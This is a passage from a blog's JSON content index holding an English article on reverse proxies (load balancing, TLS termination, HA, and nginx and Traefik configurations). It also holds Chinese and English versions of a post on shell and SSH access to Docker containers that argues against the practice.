服务","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"}],"lang":"zh-CN"},{"title":"Understanding Reverse Proxy: The Unsung Hero of Enterprise Architecture","slug":"2024/09/Understanding-Reverse-Proxy","date":"un00fin00","updated":"un22fin22","comments":false,"path":"2024/09/Understanding-Reverse-Proxy/","permalink":"https://neo01.com/2024/09/Understanding-Reverse-Proxy/","excerpt":"Ever wondered what sits between users and your backend servers? Discover why reverse proxies are essential in enterprise design and whether they're really another point of failure.","text":"You visit a website. You click a button. Behind the scenes, your request doesn’t go directly to the server running the application. Instead, it hits something else first—a reverse proxy. Most users never know it exists. But for enterprise architects, it’s indispensable. What is a Reverse Proxy? A reverse proxy is a server that sits between clients and backend servers, forwarding client requests to the appropriate backend server and returning the server’s response to the client. The Key Difference: Forward Proxy: Sits in front of clients, forwarding requests on behalf of clients to servers Reverse Proxy: Sits in front of servers, forwarding requests on behalf of servers to clients Real-World Analogy Think of a reverse proxy as a hotel concierge: Without Reverse Proxy: Guests knock directly on staff doors (chef, housekeeper, manager) Each staff member handles their own door Chaos when multiple guests arrive No one knows who’s busy or available With Reverse Proxy: All guests go to the concierge desk first Concierge knows which staff member to contact Distributes requests evenly Handles busy periods gracefully Staff can work without interruption The concierge doesn’t do the actual work—they route requests efficiently and protect staff from being overwhelmed. How Does a Reverse Proxy Work? flowchart LR Client[\"👤 Client(Browser)\"] RP[\"🚪 Reverse Proxy(nginx/Traefik)\"] subgraph Backend[\"Backend Servers\"] App1[\"🖥️ App Server 1\"] App2[\"🖥️ App Server 2\"] App3[\"🖥️ App Server 3\"] end Client -->|\"1. Request\"| RP RP -->|\"2. Forward\"| App1 RP -.->|\"Load Balance\"| App2 RP -.->|\"Load Balance\"| App3 App1 -->|\"3. Response\"| RP RP -->|\"4. Return\"| Client style RP fill:#fff3e0 style Backend fill:#e8f5e9 Request Flow: Client sends request → https://example.com/api/users DNS resolves → Points to reverse proxy IP Reverse proxy receives → Examines request (URL, headers, method) Routing decision → Determines which backend server to use Forward request → Sends to backend server Backend processes → Generates response Proxy returns → Sends response back to client What the Client Sees: Request: https:&#x2F;&#x2F;example.com&#x2F;api&#x2F;users Response: 200 OK What Actually Happens: Client → Reverse Proxy (203.0.113.10) Reverse Proxy → Backend Server (10.0.1.5:8080) Backend Server → Reverse Proxy Reverse Proxy → Client The client never knows the backend server’s real IP address or port. Why Enterprise Design Needs Reverse Proxy 1. Load Balancing Problem: Single server can’t handle all traffic during peak hours. Solution: Reverse proxy distributes requests across multiple servers. 100 requests&#x2F;sec → Reverse Proxy ├─&gt; Server 1 (33 req&#x2F;sec) ├─&gt; Server 2 (33 req&#x2F;sec) └─&gt; Server 3 (34 req&#x2F;sec) Load Balancing Algorithms: Round Robin: Distribute requests sequentially Least Connections: Send to server with fewest active connections IP Hash: Same client always goes to same server (session persistence) Weighted: Distribute based on server capacity Real-World Impact: Without load balancing: Server 1: Overloaded (crashes) Server 2: Idle Server 3: Idle Result: Service down With load balancing: All servers share load evenly No single point of overload Graceful degradation if one fails 2. SSL/TLS Termination Problem: Every backend server needs SSL certificates and encryption overhead. Solution: Reverse proxy handles all SSL/TLS encryption/decryption. flowchart LR Client[\"👤 Client\"] RP[\"🚪 Reverse Proxy\"] App1[\"🖥️ App Server 1\"] App2[\"🖥️ App Server 2\"] Client |\"🔒 HTTPS(Encrypted)\"| RP RP |\"HTTP(Plain)\"| App1 RP |\"HTTP(Plain)\"| App2 style RP fill:#fff3e0 Benefits: Single certificate: Manage SSL cert in one place Reduced CPU load: Backend servers don’t decrypt traffic Simplified updates: Update SSL config without touching apps Centralized security: Enforce TLS versions and ciphers uniformly Cost Savings: Without reverse proxy: 10 servers × $50/cert = $500/year With reverse proxy: 1 server × $50/cert = $50/year 3. Security Layer Problem: Backend servers exposed directly to internet attacks. Solution: Reverse proxy acts as security barrier. Protection Mechanisms: Hide Backend Infrastructure: Client sees: https:&#x2F;&#x2F;api.example.com Real backend: http:&#x2F;&#x2F;10.0.1.5:8080 (hidden) Rate Limiting: # Limit to 10 requests per second per IP limit_req_zone $binary_remote_addr zone&#x3D;api:10m rate&#x3D;10r&#x2F;s; IP Filtering: # Block specific IPs deny 192.168.1.100; # Allow only specific ranges allow 10.0.0.0&#x2F;8; deny all; DDoS Mitigation: Connection limits per IP Request rate limiting Automatic blacklisting of abusive IPs Web Application Firewall (WAF): SQL injection detection XSS attack prevention Malicious payload filtering 4. Caching Problem: Backend servers repeatedly generate same responses. Solution: Reverse proxy caches responses, reducing backend load. Cache Flow: First Request: Client → Proxy (cache miss) → Backend → Generate response ← Store in cache ← Return Subsequent Requests: Client → Proxy (cache hit) → Return cached response (Backend not touched) Performance Impact: Scenario Response Time Backend Load No cache 200ms 100% 50% cache hit 110ms 50% 90% cache hit 38ms 10% Cache Example: # Cache static assets for 1 day location ~* \\.(jpg|jpeg|png|css|js)$ &#123; proxy_cache my_cache; proxy_cache_valid 200 1d; proxy_pass http:&#x2F;&#x2F;backend; &#125; 5. Simplified Routing Problem: Multiple services on different ports/servers, complex for clients. Solution: Single entry point with path-based routing. Without Reverse Proxy: https:&#x2F;&#x2F;app1.example.com:8080 → Service 1 https:&#x2F;&#x2F;app2.example.com:8081 → Service 2 https:&#x2F;&#x2F;app3.example.com:8082 → Service 3 With Reverse Proxy: https:&#x2F;&#x2F;example.com&#x2F;app1 → Service 1 (10.0.1.5:8080) https:&#x2F;&#x2F;example.com&#x2F;app2 → Service 2 (10.0.1.6:8081) https:&#x2F;&#x2F;example.com&#x2F;app3 → Service 3 (10.0.1.7:8082) Routing Configuration: location &#x2F;app1 &#123; proxy_pass http:&#x2F;&#x2F;10.0.1.5:8080; &#125; location &#x2F;app2 &#123; proxy_pass http:&#x2F;&#x2F;10.0.1.6:8081; &#125; location &#x2F;api &#123; proxy_pass http:&#x2F;&#x2F;api-cluster; &#125; Benefits: Single domain: Easier to remember and manage No CORS issues: All services appear from same origin Flexible deployment: Move services without changing client URLs Microservices friendly: Route to different services transparently 6. Zero-Downtime Deployments Problem: Deploying updates requires taking servers offline. Solution: Reverse proxy enables rolling deployments. Deployment Process: Initial State: Proxy → Server 1 (v1.0) ✅ → Server 2 (v1.0) ✅ → Server 3 (v1.0) ✅ Step 1: Update Server 1 Proxy → Server 1 (v1.1) 🔄 (remove from pool) → Server 2 (v1.0) ✅ → Server 3 (v1.0) ✅ Step 2: Add Server 1 back Proxy → Server 1 (v1.1) ✅ → Server 2 (v1.0) ✅ → Server 3 (v1.0) ✅ Step 3-4: Repeat for Server 2 and 3 Proxy → Server 1 (v1.1) ✅ → Server 2 (v1.1) ✅ → Server 3 (v1.1) ✅ Health Checks: upstream backend &#123; server 10.0.1.5:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server 10.0.1.6:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server 10.0.1.7:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; &#125; If a server fails health checks, the proxy automatically removes it from rotation. Is It Another Point of Failure? Short answer: Yes, but it’s a calculated trade-off. Long answer: The benefits far outweigh the risks when properly implemented. The Concern Client → Reverse Proxy → Backend Servers ↓ Single Point of Failure? If the reverse proxy goes down, all services become unreachable—even if backend servers are healthy. The Reality: Mitigation Strategies 1. High Availability Setup Active-Passive: flowchart TD Client[\"👤 Clients\"] VIP[\"🌐 Virtual IP(203.0.113.10)\"] RP1[\"🚪 Reverse Proxy 1(Active)\"] RP2[\"🚪 Reverse Proxy 2(Standby)\"] subgraph Backend[\"Backend Servers\"] App1[\"🖥️ Server 1\"] App2[\"🖥️ Server 2\"] end Client --> VIP VIP --> RP1 VIP -.->|\"Failover\"| RP2 RP1 --> Backend RP2 -.-> Backend RP1 |\"Heartbeat\"| RP2 style RP1 fill:#c8e6c9 style RP2 fill:#ffecb3 style Backend fill:#e8f5e9 How it works: Two reverse proxies share a virtual IP Primary handles all traffic Secondary monitors primary via heartbeat If primary fails, secondary takes over virtual IP Failover time: 1-3 seconds Active-Active: Client → DNS Round Robin ├─&gt; Reverse Proxy 1 (50% traffic) └─&gt; Reverse Proxy 2 (50% traffic) ↓ Backend Servers Benefits: Both proxies handle traffic Better resource utilization Automatic load distribution If one fails, other handles 100% 2. Reverse Proxy is Simpler Than Backend Complexity Comparison: Component Complexity Failure Probability Backend App High (business logic, database, dependencies) Higher Reverse Proxy Low (routing, forwarding) Lower Why Reverse Proxy is More Reliable: Stateless: No database, no sessions (usually) Simple logic: Just routing and forwarding Battle-tested: nginx/HAProxy/Traefik are mature Fewer dependencies: Minimal external services Easier to monitor: Simple health checks Failure Rate Example: Backend application: 99.5% uptime (43.8 hours downtime&#x2F;year) Reverse proxy: 99.95% uptime (4.38 hours downtime&#x2F;year) With HA reverse proxy: 99.99% uptime (52 minutes downtime&#x2F;year) 3. Monitoring and Alerting Health Check Monitoring: # Prometheus monitoring example - alert: ReverseProxyDown expr: up&#123;job&#x3D;&quot;reverse-proxy&quot;&#125; &#x3D;&#x3D; 0 for: 1m annotations: summary: &quot;Reverse proxy is down&quot; description: &quot;Reverse proxy &#123;&#123; $labels.instance &#125;&#125; has been down for 1 minute&quot; Automated Recovery: # Systemd auto-restart [Service] Restart&#x3D;always RestartSec&#x3D;5s Monitoring Metrics: Request rate Response time Error rate (4xx, 5xx) Backend health status Connection count CPU/Memory usage 4. Geographic Distribution Multi-Region Setup: Global DNS (GeoDNS) ↓ ┌─────────┴─────────┐ ↓ ↓ US Region EU Region Reverse Proxy Reverse Proxy ↓ ↓ US Backends EU Backends Benefits: Regional failover: If US region fails, traffic goes to EU Reduced latency: Users connect to nearest region Disaster recovery: Complete region can fail without total outage Risk Comparison Without Reverse Proxy: Risks: ❌ Each backend exposed to attacks ❌ No load balancing (single server overload) ❌ Complex SSL management ❌ No caching (higher backend load) ❌ Difficult deployments ❌ No centralized monitoring Failure modes: - Individual servers overwhelmed - DDoS takes down all servers - SSL certificate expires on one server With Reverse Proxy: Risks: ⚠️ Reverse proxy is single point (mitigated with HA) Benefits: ✅ Protected backends ✅ Load distribution ✅ Centralized SSL ✅ Caching reduces load ✅ Zero-downtime deployments ✅ Centralized monitoring Failure modes: - Reverse proxy fails (but HA setup prevents this) - Much lower probability than backend failures The Verdict Is reverse proxy a single point of failure? Technically yes, but: It’s more reliable than backend applications HA setup eliminates the single point Benefits far outweigh the risk Industry standard for good reason Risk Assessment: Scenario Availability Complexity Cost No reverse proxy 99.5% Low Low Single reverse proxy 99.95% Medium Medium HA reverse proxy 99.99% Medium-High Medium-High Multi-region HA 99.999% High High 💡 Best PracticeFor production systems: Minimum: Single reverse proxy with auto-restart Recommended: Active-passive HA setup Enterprise: Active-active multi-region Even a single reverse proxy is more reliable than exposing backends directly. Popular Reverse Proxy Solutions nginx Best for: High-performance static content and simple routing Pros: Extremely fast and lightweight Low memory footprint Battle-tested (powers 30%+ of top websites) Excellent documentation Cons: Configuration can be complex Requires reload for config changes Limited dynamic configuration Use case: Traditional web applications, high-traffic sites Traefik Best for: Docker/Kubernetes environments, microservices Pros: Automatic service discovery Dynamic configuration (no reload needed) Built-in Let’s Encrypt support Beautiful dashboard Cons: Higher resource usage than nginx Steeper learning curve Younger project (less mature) Use case: Container-based deployments, cloud-native apps HAProxy Best for: Advanced load balancing, TCP/UDP proxying Pros: Extremely reliable Advanced load balancing algorithms Excellent performance monitoring TCP/UDP support (not just HTTP) Cons: Configuration syntax is unique Less intuitive than others Primarily focused on load balancing Use case: High-availability setups, complex routing needs Comparison Feature nginx Traefik HAProxy Performance ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ Ease of Use ⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐ Docker Integration ⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ Dynamic Config ⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ Maturity ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐⭐ Resource Usage ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐ Quick Start Example nginx Reverse Proxy # &#x2F;etc&#x2F;nginx&#x2F;nginx.conf http &#123; # Define backend servers upstream backend &#123; server 10.0.1.5:8080 weight&#x3D;3; server 10.0.1.6:8080 weight&#x3D;2; server 10.0.1.7:8080 weight&#x3D;1; &#125; # Rate limiting limit_req_zone $binary_remote_addr zone&#x3D;api:10m rate&#x3D;10r&#x2F;s; server &#123; listen 80; server_name example.com; # Redirect HTTP to HTTPS return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125; server &#123; listen 443 ssl http2; server_name example.com; # SSL configuration ssl_certificate &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;example.com.crt; ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;private&#x2F;example.com.key; ssl_protocols TLSv1.2 TLSv1.3; # Logging access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log; # Static files (cached) location ~* \\.(jpg|jpeg|png|gif|css|js)$ &#123; proxy_pass http:&#x2F;&#x2F;backend; proxy_cache my_cache; proxy_cache_valid 200 1d; expires 1d; add_header Cache-Control &quot;public, immutable&quot;; &#125; # API endpoints (rate limited) location &#x2F;api &#123; limit_req zone&#x3D;api burst&#x3D;20 nodelay; proxy_pass http:&#x2F;&#x2F;backend; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; # Timeouts proxy_connect_timeout 5s; proxy_send_timeout 10s; proxy_read_timeout 10s; &#125; # Health check endpoint location &#x2F;health &#123; access_log off; return 200 &quot;OK\\n&quot;; add_header Content-Type text&#x2F;plain; &#125; &#125; &#125; Traefik with Docker # docker-compose.yml version: &#39;3.8&#39; services: traefik: image: traefik:v2.10 command: - &quot;--api.dashboard&#x3D;true&quot; - &quot;--providers.docker&#x3D;true&quot; - &quot;--entrypoints.web.address&#x3D;:80&quot; - &quot;--entrypoints.websecure.address&#x3D;:443&quot; - &quot;--certificatesresolvers.myresolver.acme.email&#x3D;admin@example.com&quot; - &quot;--certificatesresolvers.myresolver.acme.storage&#x3D;&#x2F;letsencrypt&#x2F;acme.json&quot; - &quot;--certificatesresolvers.myresolver.acme.httpchallenge.entrypoint&#x3D;web&quot; ports: - &quot;80:80&quot; - &quot;443:443&quot; volumes: - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock:ro - .&#x2F;letsencrypt:&#x2F;letsencrypt labels: - &quot;traefik.http.routers.dashboard.rule&#x3D;Host(&#96;traefik.example.com&#96;)&quot; - &quot;traefik.http.routers.dashboard.service&#x3D;api@internal&quot; app1: image: myapp:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.app1.rule&#x3D;Host(&#96;app1.example.com&#96;)&quot; - &quot;traefik.http.routers.app1.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.app1.tls.certresolver&#x3D;myresolver&quot; - &quot;traefik.http.services.app1.loadbalancer.server.port&#x3D;8080&quot; app2: image: myapp:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.app2.rule&#x3D;Host(&#96;app2.example.com&#96;)&quot; - &quot;traefik.http.routers.app2.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.app2.tls.certresolver&#x3D;myresolver&quot; - &quot;traefik.http.services.app2.loadbalancer.server.port&#x3D;8080&quot; Conclusion Reverse proxies are the unsung heroes of modern web architecture. They provide load balancing, security, caching, and simplified routing—all while being more reliable than the applications they protect. Key Takeaways: Reverse proxy sits between clients and backend servers, routing requests intelligently Essential for enterprise design due to load balancing, security, SSL termination, and caching Yes, it’s a potential point of failure, but HA setups and inherent simplicity make it more reliable than alternatives Benefits far outweigh risks when properly implemented Industry standard for production deployments Is it worth the complexity? For anything beyond a simple single-server setup, absolutely. The operational benefits, security improvements, and flexibility make reverse proxies indispensable in modern infrastructure. Quick Decision Guide: Small project, single server: Optional (but still recommended) Multiple servers or services: Definitely use one Production system: Use HA reverse proxy setup Enterprise/critical system: Multi-region HA setup The question isn’t whether to use a reverse proxy—it’s which one to choose and how to make it highly available. 🚀 Resources nginx Documentation: Official nginx guide Traefik Documentation: Complete Traefik reference HAProxy Documentation: HAProxy configuration guide Let’s Encrypt: Free SSL certificates Cloudflare: Global reverse proxy/CDN service","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"}],"lang":"en"},{"title":"与 Docker 容器交互 - Shell 和 SSH","slug":"2024/07/Interacting-With-Docker-Containers-Shell-And-SSH-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/07/Interacting-With-Docker-Containers-Shell-And-SSH/","permalink":"https://neo01.com/zh-CN/2024/07/Interacting-With-Docker-Containers-Shell-And-SSH/","excerpt":"Shell和SSH访问容器很方便,但为什么它们对Docker不好?探索安全风险和更好的替代方案。","text":"Docker 通过将应用程序封装在轻量级、可移植容器中，彻底改变了我们构建、交付和运行应用程序的方式。使用 shell 和 SSH 与这些容器交互不是最佳实践，但对开发者来说很方便。在这篇博客文章中，我们将探讨如何使用 shell 访问和 SSH 与 Docker 容器交互。 容器的 Shell 访问 与正在运行的 Docker 容器交互的最直接方法是通过 Docker exec 命令，前提是您使用 shell 构建镜像。此命令允许您在正在运行的容器中运行新命令，这对于调试或快速修改特别有用。 以下是使用方法： 识别容器：首先，您需要知道容器的 ID 或名称。您可以使用 docker ps 列出所有正在运行的容器。 执行命令：要在容器内运行命令，使用 docker exec。例如，要启动交互式 shell 会话，您可以使用： docker exec -it &lt;container_id_or_name&gt; &#x2F;bin&#x2F;sh 将 &lt;container_id_or_name&gt; 替换为您实际的容器 ID 或名称。-it 标志在容器中附加交互式 tty。 ⚠️ 维护安全性请记住，使用不必要的组件（特别是 shell）构建容器镜像可能会带来安全风险。始终 FROM scratch 构建镜像以保持其干净，并与可观察性集成以进行故障排除。 SSH 进入容器 虽然 shell 访问很方便，但有时您可能需要更持久的连接方法，例如 SSH。设置对 Docker 容器的 SSH 访问涉及更多步骤： 创建 Dockerfile：您需要一个安装 SSH 并设置必要配置的 Dockerfile。这是一个简单的示例： FROM ubuntu:latest RUN apt-get update &amp;&amp; apt-get install -y openssh-server RUN mkdir &#x2F;var&#x2F;run&#x2F;sshd RUN echo &#39;root:YOUR_PASSWORD&#39; | chpasswd RUN sed -i &#39;s&#x2F;#PermitRootLogin prohibit-password&#x2F;PermitRootLogin yes&#x2F;&#39; &#x2F;etc&#x2F;ssh&#x2F;sshd_config EXPOSE 22 CMD [&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;, &quot;-D&quot;] 将 YOUR_PASSWORD 替换为您选择的安全密码。 构建并运行容器：使用 docker build 构建镜像并使用 docker run 运行它，确保映射 SSH 端口： docker build -t ssh-enabled-container . docker run -d -p 2222:22 ssh-enabled-container SSH 进入容器：使用 SSH 客户端连接到容器： ssh root@localhost -p 2222 使用您在 Dockerfile 中设置的密码登录。 ⚠️ 维护安全性请记住，在容器中暴露 SSH 可能是安全风险。始终使用强密码或 SSH 密钥，并考虑额外的安全措施，例如防火墙和 SSH 强化实践。还有其他危险的方式可以访问 SSH 端口，但我们不会在这篇文章中进一步讨论。 为什么 Shell 和 SSH 对 Docker 不好 当您 SSH 进入容器时，您本质上是将其视为传统虚拟机，这违背了容器的隔离、短暂和极简环境的理念。 安全风险：SSH 服务器为您的容器增加了不必要的复杂性和潜在漏洞。在容器中运行的每个 SSH 进程都是恶意行为者的额外攻击面。 容器膨胀：容器应该是轻量级的，只包含运行应用程序所需的基本包。安装 SSH 服务器和 shell 会增加容器的大小，并添加应用程序运行不必要的额外层。 偏离容器编排工具：现代容器编排工具（如 Kubernetes）提供自己的访问容器方法，例如 kubectl exec。使用 SSH 和 shell 可能会绕过这些工具，导致偏离标准化工作流程，并可能导致配置漂移。 有状态性：容器被设计为无状态和不可变的。SSH 和 shell 进入容器并进行更改可能导致有状态配置，这不会反映在容器的镜像或定义文件中。当容器在不同环境中重新部署或扩展时，这可能会导致问题。 生命周期管理：Docker 容器应该经常停止和启动，通过更新容器镜像来进行更改。通过使用 SSH 和 shell，您可能会被诱惑对正在运行的容器进行临时更改，这违背了不可变基础设施的原则。 管理复杂性：管理 SSH 密钥、确保它们被轮换并保持安全，为容器管理增加了额外的复杂性层。它还增加了管理容器访问的管理开销。 结论 无论您偏好 Docker exec 的简单性还是 SSH 的持久性，这两种方法都提供了与 Docker 容器交互的强大方式。请记住负责任地使用这些工具，牢记安全性，您将能够有效地管理您的容器。 我们希望本指南对您有所帮助。有关更详细的说明和最佳实践，请参阅官方 Docker 文档和 SSH 配置指南。祝容器化愉快！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://neo01.com/tags/docker/"}],"lang":"zh-CN"},{"title":"與 Docker 容器互動 - Shell 和 SSH","slug":"2024/07/Interacting-With-Docker-Containers-Shell-And-SSH-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/07/Interacting-With-Docker-Containers-Shell-And-SSH/","permalink":"https://neo01.com/zh-TW/2024/07/Interacting-With-Docker-Containers-Shell-And-SSH/","excerpt":"Shell和SSH訪問容器很方便,但為什麼它們對Docker不好?探索安全風險和更好的替代方案。","text":"Docker 通過將應用程式封裝在輕量級、可攜式容器中，徹底改變了我們建構、交付和運行應用程式的方式。使用 shell 和 SSH 與這些容器互動不是最佳實踐，但對開發者來說很方便。在這篇部落格文章中，我們將探討如何使用 shell 訪問和 SSH 與 Docker 容器互動。 容器的 Shell 訪問 與正在運行的 Docker 容器互動的最直接方法是通過 Docker exec 命令，前提是您使用 shell 建構映像。此命令允許您在正在運行的容器中運行新命令，這對於除錯或快速修改特別有用。 以下是使用方法： 識別容器：首先，您需要知道容器的 ID 或名稱。您可以使用 docker ps 列出所有正在運行的容器。 執行命令：要在容器內運行命令，使用 docker exec。例如，要啟動互動式 shell 會話，您可以使用： docker exec -it &lt;container_id_or_name&gt; &#x2F;bin&#x2F;sh 將 &lt;container_id_or_name&gt; 替換為您實際的容器 ID 或名稱。-it 標誌在容器中附加互動式 tty。 ⚠️ 維護安全性請記住，使用不必要的元件（特別是 shell）建構容器映像可能會帶來安全風險。始終 FROM scratch 建構映像以保持其乾淨，並與可觀察性整合以進行故障排除。 SSH 進入容器 雖然 shell 訪問很方便，但有時您可能需要更持久的連接方法，例如 SSH。設定對 Docker 容器的 SSH 訪問涉及更多步驟： 創建 Dockerfile：您需要一個安裝 SSH 並設定必要配置的 Dockerfile。這是一個簡單的範例： FROM ubuntu:latest RUN apt-get update &amp;&amp; apt-get install -y openssh-server RUN mkdir &#x2F;var&#x2F;run&#x2F;sshd RUN echo &#39;root:YOUR_PASSWORD&#39; | chpasswd RUN sed -i &#39;s&#x2F;#PermitRootLogin prohibit-password&#x2F;PermitRootLogin yes&#x2F;&#39; &#x2F;etc&#x2F;ssh&#x2F;sshd_config EXPOSE 22 CMD [&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;, &quot;-D&quot;] 將 YOUR_PASSWORD 替換為您選擇的安全密碼。 建構並運行容器：使用 docker build 建構映像並使用 docker run 運行它，確保映射 SSH 埠： docker build -t ssh-enabled-container . docker run -d -p 2222:22 ssh-enabled-container SSH 進入容器：使用 SSH 客戶端連接到容器： ssh root@localhost -p 2222 使用您在 Dockerfile 中設定的密碼登入。 ⚠️ 維護安全性請記住，在容器中暴露 SSH 可能是安全風險。始終使用強密碼或 SSH 金鑰，並考慮額外的安全措施，例如防火牆和 SSH 強化實踐。還有其他危險的方式可以訪問 SSH 埠，但我們不會在這篇文章中進一步討論。 為什麼 Shell 和 SSH 對 Docker 不好 當您 SSH 進入容器時，您本質上是將其視為傳統虛擬機，這違背了容器的隔離、短暫和極簡環境的理念。 安全風險：SSH 伺服器為您的容器增加了不必要的複雜性和潛在漏洞。在容器中運行的每個 SSH 進程都是惡意行為者的額外攻擊面。 容器膨脹：容器應該是輕量級的，只包含運行應用程式所需的基本套件。安裝 SSH 伺服器和 shell 會增加容器的大小，並添加應用程式運行不必要的額外層。 偏離容器編排工具：現代容器編排工具（如 Kubernetes）提供自己的訪問容器方法，例如 kubectl exec。使用 SSH 和 shell 可能會繞過這些工具，導致偏離標準化工作流程，並可能導致配置漂移。 有狀態性：容器被設計為無狀態和不可變的。SSH 和 shell 進入容器並進行更改可能導致有狀態配置，這不會反映在容器的映像或定義檔案中。當容器在不同環境中重新部署或擴展時，這可能會導致問題。 生命週期管理：Docker 容器應該經常停止和啟動，通過更新容器映像來進行更改。通過使用 SSH 和 shell，您可能會被誘惑對正在運行的容器進行臨時更改，這違背了不可變基礎設施的原則。 管理複雜性：管理 SSH 金鑰、確保它們被輪換並保持安全，為容器管理增加了額外的複雜性層。它還增加了管理容器訪問的管理開銷。 結論 無論您偏好 Docker exec 的簡單性還是 SSH 的持久性，這兩種方法都提供了與 Docker 容器互動的強大方式。請記住負責任地使用這些工具，牢記安全性，您將能夠有效地管理您的容器。 我們希望本指南對您有所幫助。有關更詳細的說明和最佳實踐，請參閱官方 Docker 文件和 SSH 配置指南。祝容器化愉快！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://neo01.com/tags/docker/"}],"lang":"zh-TW"},{"title":"Interacting with Docker Containers - Shell and SSH","slug":"2024/07/Interacting-With-Docker-Containers-Shell-And-SSH","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2024/07/Interacting-With-Docker-Containers-Shell-And-SSH/","permalink":"https://neo01.com/2024/07/Interacting-With-Docker-Containers-Shell-And-SSH/","excerpt":"Shell and SSH access to containers is convenient, but why are they bad for Docker? Explore the security risks and better alternatives for container interaction.","text":"Docker has revolutionized the way we build, ship, and run applications by encapsulating them in lightweight, portable containers. Interacting with these containers with shell and SSH is not the best practice but convenient for developers. In this blog post, we’ll explore how to interact with Docker containers using shell access and SSH. Shell Access to Containers The most straightforward method to interact with a running Docker container is through the Docker exec command, in case you build the image with shell. This command allows you to run a new command in a running container, which is especially useful for debugging or quick modifications. Here’s how you can use it: Identify the Container: First, you need to know the container’s ID or name. You can list all running containers with docker ps. Execute a Command: To run a command inside the container, use docker exec. For example, to start an interactive shell session, you can use: docker exec -it &lt;container_id_or_name&gt; &#x2F;bin&#x2F;sh Replace &lt;container_id_or_name&gt; with your actual container ID or name. The -it flags attach an interactive tty in the container. ⚠️ Maintain Security: Remember that building a container image with unnecessary components, especially a shell, can pose a security risk. Always build the image FROM scratch to keep it clean and integrate with observability for troubleshooting. SSH into Containers While shell access is convenient, sometimes you may need a more persistent connection method, like SSH. Setting up SSH access to a Docker container involves a few more steps: Create a Dockerfile: You’ll need a Dockerfile that installs SSH and sets up the necessary configurations. Here’s a simple example: FROM ubuntu:latest RUN apt-get update &amp;&amp; apt-get install -y openssh-server RUN mkdir &#x2F;var&#x2F;run&#x2F;sshd RUN echo &#39;root:YOUR_PASSWORD&#39; | chpasswd RUN sed -i &#39;s&#x2F;#PermitRootLogin prohibit-password&#x2F;PermitRootLogin yes&#x2F;&#39; &#x2F;etc&#x2F;ssh&#x2F;sshd_config EXPOSE 22 CMD [&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;, &quot;-D&quot;] Replace YOUR_PASSWORD with a secure password of your choice. Build and Run the Container: Build the image with docker build and run it with docker run, making sure to map the SSH port: docker build -t ssh-enabled-container . docker run -d -p 2222:22 ssh-enabled-container SSH into the Container: Use an SSH client to connect to the container: ssh root@localhost -p 2222 Use the password you set in the Dockerfile to log in. ⚠️ Maintain Security: Remember that exposing SSH in a container can be a security risk. Always use strong passwords or SSH keys, and consider additional security measures like firewalls and SSH hardening practices. There are other dangerous ways to access the SSH port but we will not go further in this post. Why Shell and SSH are bad for Docker When you SSH into a container, you’re essentially treating it like a traditional virtual machine, which goes against the container philosophy of isolated, ephemeral, and minimalistic environments. Security Risks: SSH servers add unnecessary complexity and potential vulnerabilities to your container. Each SSH process running in a container is an additional attack surface for malicious actors. Container Bloat: Containers are meant to be lightweight and contain only the essential packages needed to run the application. Installing an SSH server and shell increases the size of the container and adds extra layers that are not necessary for the application to function. Deviation from Container Orchestration Tools: Modern container orchestration tools like Kubernetes provide their own methods for accessing containers, such as kubectl exec. Using SSH and shell can bypass these tools, leading to a deviation from standardized workflows and potentially causing configuration drift. Statefulness: Containers are designed to be stateless and immutable. SSH’ing and shell into a container and making changes can lead to a stateful configuration that is not reflected in the container’s image or definition files. This can cause issues when the container is redeployed or scaled across different environments. Lifecycle Management: Docker containers are meant to be stopped and started frequently, with changes being made through updates to the container image. By using SSH and shell, you might be tempted to make ad-hoc changes to the running container, which is against the principles of immutable infrastructure. Complexity in Management: Managing SSH keys, ensuring they 